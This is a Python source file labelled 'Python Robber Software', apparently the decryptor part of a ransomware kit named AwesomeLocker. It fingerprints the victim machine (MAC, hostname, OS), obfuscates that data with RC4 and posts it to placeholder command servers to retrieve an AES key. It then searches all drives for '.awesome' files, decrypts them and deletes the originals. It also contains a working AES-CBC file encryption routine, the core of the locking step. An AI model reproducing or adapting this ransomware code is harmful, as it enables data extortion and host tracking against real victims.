#!/usr/bin/env python
# encoding=utf-8

"""
    Python Robber Software
"""

import os
# import rsa
import json
import uuid
import hashlib
import requests
import platform
from hashlib import md5
from Crypto import Random
from Crypto.Cipher import AES

MATCH_FILE_TYPE = ['.awesome', ]
DRIVE_PATH = ['C', 'D', 'E', 'F', 'G', 'H', 'I',
              'A', 'B', 'J', 'K', 'L', 'M', 'N',
              'O', 'P', 'Q', 'R', 'S', 'T', 'U',
              'V', 'W', 'X', 'Y', 'Z']


class LocateFiles:
    """
    定位磁盘内被加密的文件路径
    """

    def __init__(self):
        self.get_system_drive_path()
        self.files_path = []
        self.match_min_size = 1
        self.match_max_size = 1024 * 1024 * 1024

    def get_system_drive_path(self):
        """
            find system drive, only encrypt Desktop. I am good man.
            Win10, Win7, Win8     %USERPROFILE%\Desktop
            WinXP                 %USERPROFILE%\桌面
        """
        global DRIVE_PATH
        user_desktop = "\\Desktop\\"
        try:
            user_profile = os.popen('echo %USERPROFILE%').read().strip()
            DRIVE_PATH[DRIVE_PATH.index(user_profile[0])] = user_profile + user_desktop
        except Exception as err:
            print(err)

    def start_locate_files(self):
        for DRIVE in DRIVE_PATH:
            if len(DRIVE) == 1:
                DRIVE += ":\\"

            for (dirpath, dirnames, filenames) in os.walk(DRIVE):
                for filename in filenames:
                    absolute_path = os.path.join(dirpath, filename)
                    # print(absolute_path)
                    try:
                        # 如果文件大于1B且小于1024M
                        if self.match_min_size < os.path.getsize(absolute_path) < self.match_max_size:
                            file_type = os.path.splitext(absolute_path)[1]
                            if file_type.lower() in MATCH_FILE_TYPE:

                                self.files_path.append(absolute_path)

                                # open(r'C:\Users\xyz\Desktop\match_encrypted.txt', 'a').write(absolute_path + '\n')

                    except Exception as err:
                        print(err)

        if self.files_path:
            return self.files_path

        return None


class AwesomeUnlocker:
    """
    AwesomeLocker 使用 AES 加密文件, 密码从服务器获得
    """
    def __init__(self, password):
        self.password = password

    def derive_key_and_iv(self, salt, key_length, iv_length):
        """
            derive_key_and_iv 生成 Key 和 IV
            :param salt:     加盐
            :param key_length:
            :param iv_length:
        """
        d = d_i = ''.encode('utf-8')
        password = self.password.encode('utf-8')

        while len(d) < key_length + iv_length:
            d_i = md5(d_i + password + salt).digest()
            d += d_i

        return d[:key_length], d[key_length:key_length + iv_length]

    def encrypt(self, in_file, out_file, key_length=32):
        bs = AES.block_size  # 16
        salt = Random.new().read(bs - len('Salted__'))
        key, iv = self.derive_key_and_iv(salt, key_length, bs)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        out_file.write('Salted__'.encode('utf-8') + salt)
        finished = False
        while not finished:
            chunk = in_file.read(1024 * bs)
            if len(chunk) == 0 or len(chunk) % bs != 0:
                padding_length = (bs - len(chunk) % bs) or bs  # 如果不是16的整数倍需要手动填充, 得到需要填充的位数
                chunk += padding_length * chr(padding_length).encode('utf-8')  # 填充内容为chr(padding_length)
                finished = True
            out_file.write(cipher.encrypt(chunk))

    def decrypt(self, in_file, out_file, key_length=32):
        bs = AES.block_size
        salt = in_file.read(bs)[len('Salted__'):]   # 读取盐值, 8字节
        key, iv = self.derive_key_and_iv(salt, key_length, bs)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        next_chunk = b''
        finished = False
        while not finished:
            chunk, next_chunk = next_chunk, cipher.decrypt(in_file.read(1024 * bs))
            if len(next_chunk) == 0:  # 文件获取不到内容返回0
                padding_length = ord(chr(chunk[-1]))  # 由于加密时不够16位的用chr(16-remain)填充, 所以chunk[-1]既是字符又是长度
                chunk = chunk[:-padding_length]  # 解密时需要去掉之前填充的字符
                finished = True
            out_file.write(chunk)


class GetKeys:
    def __init__(self):
        self.rc4_key = "Oops...."
        self.public_key_url = "http://IP/rsa-pk"
        self.aes_key_url = "http://IP/aes-key"

    @staticmethod
    def rc4(data, key):
        """
        :param data: 需要加密的数据
        :param key: RC4加密或解密的密钥
        :return: 加密或解密后的内容
        """
        box = list(range(256))

        x = 0
        for i in range(256):
            x = (x + box[i] + ord(key[i % len(key)])) % 256
            tmp = box[i]
            box[i] = box[x]
            box[x] = tmp

        x = 0
        y = 0
        out = []

        for char in data:
            x = (x + 1) % 256
            y = (y + box[x]) % 256
            box[x], box[y] = box[y], box[x]
            k = box[(box[x] + box[y]) % 256]
            out.append(chr(ord(char) ^ k))

        return ''.join(out)

    def generate_post_data(self):
        """
        生成需要post的数据, 以便后面获取rsa公钥
        :return: rc4加密的json
        """
        content = {'mac': uuid.uuid1().hex[-12:].upper(),
                   'platform': platform.uname().system + ' ' + platform.uname().release,
                   'hostname': platform.uname().node
                   }

        json_post_data = json.dumps(content)
        hash_uuid = hashlib.sha1(str(sorted(content.items())).encode('utf-8')).hexdigest()

        print(hash_uuid, json_post_data)
        return hash_uuid, self.rc4(json_post_data, self.rc4_key)

    def get_public_key(self):
        """
        获取用来RSA传送AES KEY的公钥, 用来解密服务端用私钥加密的AES KEY
        :return: 返回RSA 公钥
        """
        hash_uuid, uuid_data = self.generate_post_data()

        data = {'uuid': uuid_data,
                'hash': hash_uuid,
                }

        response = requests.post(self.public_key_url, data=data, timeout=5)

        if response.status_code == 200:
            return response.text

        return None

    def get_aes_key(self, public_key=None):
        """
        加密/解密才需要调用此函数来获取服务器存储的AES KEY
        从服务端获取AES KEY, KEY由 rsa 私钥加密, 需要用获取到的公钥解密
        POST需要提交rsa公钥才能获取对应的AES KEY
        :param public_key:
        :return: AES KEY
        """
        if public_key is None:
            public_key = self.get_public_key()

        post_data = {'public_key': public_key}
        response = requests.post(self.aes_key_url, data=post_data, timeout=5)

        if response.status_code == 200:
            return response.text

        return None


if __name__ == "__main__":

    keys = GetKeys()
    pk = keys.get_public_key()
    aes_key = keys.get_aes_key(pk)

    files = LocateFiles().start_locate_files()

    if aes_key:
        unlocker = AwesomeUnlocker(aes_key)

    if files and unlocker:
        print("Done...")
        for file in files:
            with open(file, 'rb') as in_file, open(file[:file.index(".awesome")], 'wb') as out_file:
                unlocker.decrypt(in_file, out_file)
                print(file + " Decrypted")
            try:
                os.remove(file)
            except Exception as err:
                print(err)
